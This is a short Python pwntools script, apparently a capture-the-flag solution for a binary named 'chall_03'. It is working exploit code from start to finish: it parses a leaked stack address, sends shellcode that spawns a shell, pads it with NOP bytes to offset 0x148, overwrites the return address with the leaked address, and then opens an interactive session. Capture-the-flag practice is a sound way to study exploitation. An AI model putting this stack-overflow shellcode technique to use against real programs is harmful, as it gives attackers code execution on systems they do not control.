#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_03')

p = process(binary.path)


# p.sendlineafter('Just in time.\n','foobar')

p.recvuntil(b"Here's a leak :)")
_ = p.recvline().strip()
stack = int(_,16)
log.info('stack: ' + hex(stack))

payload = b''
payload += asm(shellcraft.sh())
payload += (0x148 - len(payload)) * b'\x90'
payload += p64(stack)

p.sendline(payload)
p.interactive()
